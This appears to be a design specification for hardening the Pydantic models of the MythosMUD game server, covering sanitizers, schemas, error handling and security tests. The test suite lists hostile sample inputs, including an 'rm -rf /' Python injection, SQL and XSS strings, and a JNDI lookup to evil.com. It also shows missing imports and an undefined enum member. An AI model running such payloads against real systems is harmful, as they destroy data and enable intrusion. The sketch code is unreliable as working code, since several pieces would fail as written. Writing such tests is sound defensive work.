# Pydantic Remediation Technical Specification

## Architecture Overview

### Current State Analysis

The MythosMUD server currently uses Pydantic v2 with inconsistent patterns:

```python
# Current problematic patterns found

# 1. Inconsistent configuration

class SomeModel(BaseModel):
    # No model_config - security risk

# 2. Unsafe Any types

class PlayerCreate(BaseModel):
    stats: dict[str, Any]  # Type safety risk

# 3. Duplicate validation logic

class SayCommand(BaseCommand):
    @field_validator("message")
    def validate_message(cls, v):
        # Duplicated validation logic

# 4. Poor error handling

try:
    model = SomeModel(**data)
except ValidationError:
    # Generic error handling

```

### Target Architecture

```python
# Target secure patterns

# 1. Consistent base classes

class SecureBaseModel(BaseModel):
    model_config = ConfigDict(
        extra="forbid",
        validate_assignment=True,
        use_enum_values=True,
        str_strip_whitespace=True,
        validate_default=True,
        arbitrary_types_allowed=False,
    )

# 2. Proper typing

class StatsModel(SecureBaseModel):
    strength: int = Field(ge=1, le=20)
    dexterity: int = Field(ge=1, le=20)
    # ... other fields with proper types

# 3. Centralized validation

class MessageValidator:
    @staticmethod
    def validate_message(v: str) -> str:
        # Centralized validation logic

# 4. Structured error handling

class ValidationErrorHandler:
    @staticmethod
    def handle_validation_error(error: ValidationError) -> dict:
        # Structured error responses

```

## Security Implementation

### Input Validation Framework

```python
import re
from typing import Any
from pydantic import BaseModel, Field, field_validator

class InputSanitizer:
    """Centralized input sanitization for security."""

    # Dangerous character patterns

    DANGEROUS_CHARS = ["<", ">", "&", '"', "'", ";", "|", "`", "$", "(", ")"]

    # Injection patterns

    INJECTION_PATTERNS = [
        r"\b(and|or)\s*=\s*['\"]?\w+",  # SQL injection
        r"__import__\(|eval\(|exec\(|system\(|os\.",  # Python injection
        r"%[a-zA-Z]\s*[^\s]*",  # Format string injection
    ]

    @classmethod
    def sanitize_text(cls, text: str, max_length: int = 1000) -> str:
        """Sanitize text input for security."""
        if not isinstance(text, str):
            raise ValueError("Input must be a string")

        # Length validation

        if len(text) > max_length:
            raise ValueError(f"Input too long: {len(text)} > {max_length}")

        # Dangerous character check

        found_chars = [char for char in cls.DANGEROUS_CHARS if char in text]
        if found_chars:
            raise ValueError(f"Dangerous characters detected: {found_chars}")

        # Injection pattern check

        for pattern in cls.INJECTION_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                raise ValueError("Injection pattern detected")

        return text.strip()

class MessageValidator:
    """Validates message content for commands."""

    @staticmethod
    def validate_message(v: str) -> str:
        """Validate message content with security checks."""
        return InputSanitizer.sanitize_text(v, max_length=500)

    @staticmethod
    def validate_player_name(v: str) -> str:
        """Validate player name format."""
        if not re.match(r"^[a-zA-Z][a-zA-Z0-9_-]*$", v):
            raise ValueError(
                "Player name must start with a letter and contain only "
                "letters, numbers, underscores, and hyphens"
            )
        return v.strip()
```

### Secure Base Model Implementation

```python
from pydantic import BaseModel, ConfigDict, Field
from datetime import datetime, UTC
from typing import Any, Optional

class SecureBaseModel(BaseModel):
    """Base model with security configurations."""

    model_config = ConfigDict(
        # Security settings

        extra="forbid",  # Prevent field injection
        validate_assignment=True,  # Runtime validation
        use_enum_values=True,  # Enum validation
        str_strip_whitespace=True,  # Input sanitization
        validate_default=True,  # Validate defaults
        arbitrary_types_allowed=False,  # Type safety

        # Performance settings

        from_attributes=True,  # ORM compatibility
        populate_by_name=True,  # Field alias support
    )

class TimestampedModel(SecureBaseModel):
    """Base model with timestamp fields."""

    created_at: datetime = Field(
        default_factory=lambda: datetime.now(UTC),
        description="Creation timestamp"
    )
    updated_at: datetime = Field(
        default_factory=lambda: datetime.now(UTC),
        description="Last update timestamp"
    )

    def update_timestamp(self) -> None:
        """Update the updated_at timestamp."""
        self.updated_at = datetime.now(UTC)

class ValidatedModel(SecureBaseModel):
    """Base model with common validation mixins."""

    @classmethod
    def validate_all_fields(cls, values: dict[str, Any]) -> dict[str, Any]:
        """Validate all fields with security checks."""
        # Apply common validations

        for key, value in values.items():
            if isinstance(value, str):
                values[key] = InputSanitizer.sanitize_text(value)
        return values
```

## Model Redesign Specifications

### Command Models Refactoring

```python
from typing import Literal, Union
from enum import Enum

class Direction(str, Enum):
    """Valid directions for movement and looking."""
    NORTH = "north"
    SOUTH = "south"
    EAST = "east"
    WEST = "west"

class CommandType(str, Enum):
    """Valid command types for MythosMUD."""
    LOOK = "look"
    GO = "go"
    SAY = "say"
    LOCAL = "local"
    # ... other commands

class BaseCommand(SecureBaseModel):
    """Base class for all commands with security features."""

    # Common validation mixin

    _validator = MessageValidator()

class MessageCommand(BaseCommand):
    """Base class for commands with message content."""

    message: str = Field(..., min_length=1, max_length=500)

    @field_validator("message")
    @classmethod
    def validate_message(cls, v: str) -> str:
        return MessageCommand._validator.validate_message(v)

class PlayerCommand(BaseCommand):
    """Base class for commands targeting players."""

    player_name: str = Field(..., min_length=1, max_length=50)

    @field_validator("player_name")
    @classmethod
    def validate_player_name(cls, v: str) -> str:
        return PlayerCommand._validator.validate_player_name(v)

# Specific command implementations

class SayCommand(MessageCommand):
    """Command for saying something to other players."""
    command_type: Literal[CommandType.SAY] = CommandType.SAY

class MuteCommand(PlayerCommand):
    """Command for muting a player."""
    command_type: Literal[CommandType.MUTE] = CommandType.MUTE
    duration_minutes: Optional[int] = Field(None, ge=1, le=10080)
    reason: Optional[str] = Field(None, max_length=200)

    @field_validator("reason")
    @classmethod
    def validate_reason(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        return MessageCommand._validator.validate_message(v)
```

### Game Models Refactoring

```python
from typing import List, Dict, Any
from enum import Enum

class AttributeType(str, Enum):
    """Core attribute types for character system."""
    STR = "strength"
    DEX = "dexterity"
    CON = "constitution"
    INT = "intelligence"
    WIS = "wisdom"
    CHA = "charisma"
    SAN = "lucidity"
    OCC = "occult_knowledge"
    FEAR = "fear"
    CORR = "corruption"
    CULT = "cult_affiliation"

class StatusEffectType(str, Enum):
    """Status effects that can be applied to characters."""
    STUNNED = "stunned"
    POISONED = "poisoned"
    HALLUCINATING = "hallucinating"
    PARANOID = "paranoid"
    TREMBLING = "trembling"
    CORRUPTED = "corrupted"
    DELIRIOUS = "delirious"

class StatusEffectModel(SecureBaseModel):
    """Represents a status effect with proper validation."""

    effect_type: StatusEffectType
    duration: int = Field(ge=0, description="Duration in game ticks (0 = permanent)")
    intensity: int = Field(ge=1, le=10, description="Effect intensity from 1-10")
    source: Optional[str] = Field(None, max_length=100, description="Source of the effect")
    applied_at: datetime = Field(default_factory=lambda: datetime.now(UTC))

    @field_validator("source")
    @classmethod
    def validate_source(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        return InputSanitizer.sanitize_text(v, max_length=100)

class StatsModel(SecureBaseModel):
    """Character statistics with proper validation."""

    # Physical Attributes

    strength: int = Field(ge=1, le=20, description="Physical power and combat damage")
    dexterity: int = Field(ge=1, le=20, description="Agility, reflexes, and speed")
    constitution: int = Field(ge=1, le=20, description="Health, stamina, and resistance")

    # Mental Attributes

    intelligence: int = Field(ge=1, le=20, description="Problem-solving and magical aptitude")
    wisdom: int = Field(ge=1, le=20, description="Perception, common sense, and willpower")
    charisma: int = Field(ge=1, le=20, description="Social skills and influence")

    # Horror-Specific Attributes

    lucidity: int = Field(ge=0, le=100, default=100, description="Mental stability")
    occult_knowledge: int = Field(ge=0, le=100, default=0, description="Knowledge of forbidden lore")
    fear: int = Field(ge=0, le=100, default=0, description="Susceptibility to terror")

    # Special Attributes

    corruption: int = Field(ge=0, le=100, default=0, description="Taint from dark forces")
    cult_affiliation: int = Field(ge=0, le=100, default=0, description="Cult ties")

    # Current health

    current_health: int = Field(ge=0, default=100, description="Current health points")

    @computed_field
    @property
    def max_health(self) -> int:
        """Calculate max health based on constitution."""
        return self.constitution * 10

    @computed_field
    @property
    def max_lucidity(self) -> int:
        """Calculate max lucidity based on wisdom."""
        return self.wisdom * 5

    def get_attribute_modifier(self, attribute: AttributeType) -> int:
        """Get the modifier for a given attribute."""
        attr_value = getattr(self, attribute.value, 10)
        return (attr_value - 10) // 2

class InventoryItemModel(SecureBaseModel):
    """Inventory item with proper validation."""

    item_id: str = Field(..., min_length=1, max_length=100)
    quantity: int = Field(ge=1, default=1)
    custom_properties: Dict[str, Any] = Field(default_factory=dict, max_length=50)

    @field_validator("item_id")
    @classmethod
    def validate_item_id(cls, v: str) -> str:
        return InputSanitizer.sanitize_text(v, max_length=100)

    @field_validator("custom_properties")
    @classmethod
    def validate_custom_properties(cls, v: Dict[str, Any]) -> Dict[str, Any]:
        # Validate custom properties don't contain dangerous content

        for key, value in v.items():
            if isinstance(value, str):
                v[key] = InputSanitizer.sanitize_text(value, max_length=1000)
        return v

class PlayerModel(SecureBaseModel):
    """Player model with proper validation and security."""

    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    name: str = Field(min_length=1, max_length=50)
    stats: StatsModel = Field(default_factory=StatsModel)
    inventory: List[InventoryItemModel] = Field(default_factory=list, max_length=1000)
    status_effects: List[StatusEffectModel] = Field(default_factory=list, max_length=100)
    current_room_id: str = Field(default="earth_arkhamcity_northside_intersection_derby_high")
    created_at: datetime = Field(default_factory=lambda: datetime.now(UTC))
    last_active: datetime = Field(default_factory=lambda: datetime.now(UTC))

    # Game state

    experience_points: int = Field(ge=0, default=0)
    level: int = Field(ge=1, default=1)

    # Admin privileges

    is_admin: bool = Field(default=False)

    @field_validator("name")
    @classmethod
    def validate_name(cls, v: str) -> str:
        return MessageValidator.validate_player_name(v)

    @field_validator("current_room_id")
    @classmethod
    def validate_room_id(cls, v: str) -> str:
        return InputSanitizer.sanitize_text(v, max_length=200)
```

## Schema Redesign Specifications

### User Schema Refactoring

```python
from uuid import UUID
from typing import Optional

class UserBase(SecureBaseModel):
    """Base user schema with common fields."""

    username: str = Field(..., min_length=3, max_length=50)
    is_active: bool = Field(default=True)
    is_superuser: bool = Field(default=False)

    @field_validator("username")
    @classmethod
    def validate_username(cls, v: str) -> str:
        if not re.match(r"^[a-zA-Z][a-zA-Z0-9_]*$", v):
            raise ValueError(
                "Username must start with a letter and contain only "
                "letters, numbers, and underscores"
            )
        return v.strip()

class UserCreate(UserBase):
    """Schema for creating a new user."""

    password: str = Field(..., min_length=8, max_length=128)

    @field_validator("password")
    @classmethod
    def validate_password(cls, v: str) -> str:
        # Basic password strength validation

        if len(v) < 8:
            raise ValueError("Password must be at least 8 characters long")
        if not re.search(r"[A-Z]", v):
            raise ValueError("Password must contain at least one uppercase letter")
        if not re.search(r"[a-z]", v):
            raise ValueError("Password must contain at least one lowercase letter")
        if not re.search(r"\d", v):
            raise ValueError("Password must contain at least one digit")
        return v

class UserRead(UserBase):
    """Schema for reading user data."""

    user_id: UUID
    created_at: datetime
    updated_at: datetime

    model_config = ConfigDict(
        from_attributes=True,
        # Exclude sensitive fields from serialization

        json_schema_extra={"exclude": ["password"]}
    )

class UserUpdate(SecureBaseModel):
    """Schema for updating user data."""

    username: Optional[str] = Field(None, min_length=3, max_length=50)
    password: Optional[str] = Field(None, min_length=8, max_length=128)
    is_active: Optional[bool] = None
    is_superuser: Optional[bool] = None

    @field_validator("username")
    @classmethod
    def validate_username(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        return UserCreate.validate_username(v)

    @field_validator("password")
    @classmethod
    def validate_password(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        return UserCreate.validate_password(v)
```

### Player Schema Refactoring

```python
class PlayerBase(SecureBaseModel):
    """Base player schema with common fields."""

    name: str = Field(..., min_length=1, max_length=50)
    current_room_id: str = Field(
        default="earth_arkhamcity_northside_intersection_derby_high",
        max_length=200
    )
    experience_points: int = Field(default=0, ge=0)
    level: int = Field(default=1, ge=1)

    @field_validator("name")
    @classmethod
    def validate_name(cls, v: str) -> str:
        return MessageValidator.validate_player_name(v)

    @field_validator("current_room_id")
    @classmethod
    def validate_room_id(cls, v: str) -> str:
        return InputSanitizer.sanitize_text(v, max_length=200)

class PlayerCreate(PlayerBase):
    """Schema for creating a new player."""

    user_id: UUID
    stats: StatsModel = Field(default_factory=StatsModel)
    inventory: List[InventoryItemModel] = Field(default_factory=list)
    status_effects: List[StatusEffectModel] = Field(default_factory=list)

class PlayerRead(PlayerBase):
    """Schema for reading player data."""

    id: UUID
    user_id: UUID
    profession_id: int = Field(default=0)
    profession_name: Optional[str] = Field(default=None, max_length=100)
    profession_description: Optional[str] = Field(default=None, max_length=500)
    profession_flavor_text: Optional[str] = Field(default=None, max_length=1000)
    stats: StatsModel
    inventory: List[InventoryItemModel]
    status_effects: List[StatusEffectModel]
    created_at: datetime
    last_active: datetime
    is_admin: bool = Field(default=False)

    model_config = ConfigDict(
        from_attributes=True,
        populate_by_name=True,
        # Exclude sensitive fields

        json_schema_extra={"exclude": ["user_id"]}
    )

class PlayerUpdate(SecureBaseModel):
    """Schema for updating player data."""

    name: Optional[str] = Field(None, min_length=1, max_length=50)
    current_room_id: Optional[str] = Field(None, max_length=200)
    experience_points: Optional[int] = Field(None, ge=0)
    level: Optional[int] = Field(None, ge=1)
    stats: Optional[StatsModel] = None
    inventory: Optional[List[InventoryItemModel]] = None
    status_effects: Optional[List[StatusEffectModel]] = None

    @field_validator("name")
    @classmethod
    def validate_name(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        return MessageValidator.validate_player_name(v)

    @field_validator("current_room_id")
    @classmethod
    def validate_room_id(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        return InputSanitizer.sanitize_text(v, max_length=200)
```

## Error Handling Implementation

### Validation Error Handler

```python
from pydantic import ValidationError
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class ValidationErrorHandler:
    """Handles Pydantic validation errors securely."""

    @staticmethod
    def handle_validation_error(error: ValidationError) -> Dict[str, Any]:
        """Convert ValidationError to secure error response."""

        # Log the error for debugging (without sensitive data)

        logger.warning(
            "Validation error occurred",
            error_count=len(error.errors()),
            error_types=[err["type"] for err in error.errors()]
        )

        # Create secure error response

        response = {
            "error": "Validation failed",
            "detail": "One or more fields failed validation",
            "errors": []
        }

        # Process individual field errors

        for error_detail in error.errors():
            field_error = {
                "field": error_detail.get("loc", ["unknown"])[-1],
                "message": ValidationErrorHandler._sanitize_error_message(
                    error_detail.get("msg", "Unknown error")
                ),
                "type": error_detail.get("type", "unknown")
            }

            # Add input value if safe to do so

            if "input" in error_detail:
                input_value = error_detail["input"]
                if isinstance(input_value, (str, int, float, bool)):
                    field_error["received"] = input_value

            response["errors"].append(field_error)

        return response

    @staticmethod
    def _sanitize_error_message(message: str) -> str:
        """Sanitize error messages to prevent information leakage."""

        # Remove potentially sensitive information

        sensitive_patterns = [
            r"password",
            r"secret",
            r"token",
            r"key",
            r"credential",
        ]

        for pattern in sensitive_patterns:
            if re.search(pattern, message, re.IGNORECASE):
                return "Field validation failed"

        return message

class SecurityValidationError(Exception):
    """Raised when security validation fails."""

    def __init__(self, message: str, field: str = None):
        self.message = message
        self.field = field
        super().__init__(self.message)
```

## Performance Optimization

### Lazy Validation Implementation

```python
from typing import Any, Dict, Optional
from functools import lru_cache

class LazyValidator:
    """Implements lazy validation for performance optimization."""

    @staticmethod
    @lru_cache(maxsize=1000)
    def validate_cached_input(input_value: str, input_type: str) -> str:
        """Cache validation results for repeated inputs."""
        if input_type == "message":
            return MessageValidator.validate_message(input_value)
        elif input_type == "player_name":
            return MessageValidator.validate_player_name(input_value)
        else:
            return InputSanitizer.sanitize_text(input_value)

    @staticmethod
    def clear_cache():
        """Clear validation cache."""
        LazyValidator.validate_cached_input.cache_clear()

class PerformanceModel(SecureBaseModel):
    """Base model with performance optimizations."""

    model_config = ConfigDict(
        # Performance settings

        validate_assignment=False,  # Disable runtime validation for performance
        validate_default=False,     # Disable default validation
        extra="ignore",             # Allow extra fields for flexibility
    )

    def __init__(self, **data):
        # Only validate on initialization

        super().__init__(**data)
```

## Testing Specifications

### Security Test Framework

```python
import pytest
from pydantic import ValidationError
from typing import List, Dict, Any

class SecurityTestSuite:
    """Comprehensive security test suite for Pydantic models."""

    @staticmethod
    def test_injection_prevention():
        """Test prevention of various injection attacks."""

        injection_attempts = [
            "'; DROP TABLE users; --",
            "__import__('os').system('rm -rf /')",
            "eval('malicious_code')",
            "{{config.items()}}",
            "${jndi:ldap://evil.com/exploit}",
        ]

        for attempt in injection_attempts:
            with pytest.raises(ValidationError):
                SayCommand(message=attempt)

    @staticmethod
    def test_input_sanitization():
        """Test input sanitization."""

        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "eval('malicious_code')",
        ]

        for input_val in dangerous_inputs:
            with pytest.raises(ValidationError):
                InputSanitizer.sanitize_text(input_val)

    @staticmethod
    def test_rate_limiting():
        """Test rate limiting validation."""

        # Test rapid validation attempts

        for i in range(1000):
            try:
                SayCommand(message=f"test message {i}")
            except ValidationError:
                # Expected after rate limit exceeded

                break

    @staticmethod
    def test_error_message_security():
        """Test that error messages don't leak sensitive information."""

        with pytest.raises(ValidationError) as exc_info:
            UserCreate(username="test", password="weak")

        error_response = ValidationErrorHandler.handle_validation_error(exc_info.value)

        # Ensure no sensitive information in error messages

        assert "password" not in str(error_response)
        assert "secret" not in str(error_response)
```

## Migration Strategy

### Backward Compatibility

```python
class MigrationHelper:
    """Helper for migrating from old to new models."""

    @staticmethod
    def migrate_old_player_data(old_data: Dict[str, Any]) -> PlayerModel:
        """Migrate old player data to new model format."""

        # Convert old stats dict to StatsModel

        if isinstance(old_data.get("stats"), dict):
            old_data["stats"] = StatsModel(**old_data["stats"])

        # Convert old inventory list to InventoryItemModel list

        if isinstance(old_data.get("inventory"), list):
            old_data["inventory"] = [
                InventoryItemModel(**item) if isinstance(item, dict) else item
                for item in old_data["inventory"]
            ]

        # Convert old status effects

        if isinstance(old_data.get("status_effects"), list):
            old_data["status_effects"] = [
                StatusEffectModel(**effect) if isinstance(effect, dict) else effect
                for effect in old_data["status_effects"]
            ]

        return PlayerModel(**old_data)

    @staticmethod
    def validate_migration(old_data: Dict[str, Any], new_model: SecureBaseModel) -> bool:
        """Validate that migration was successful."""
        try:
            # Ensure new model can be serialized and deserialized

            serialized = new_model.model_dump()
            deserialized = new_model.__class__(**serialized)
            return True
        except Exception:
            return False
```

This technical specification provides a comprehensive blueprint for implementing secure, performant, and maintainable Pydantic models throughout the MythosMUD server codebase.
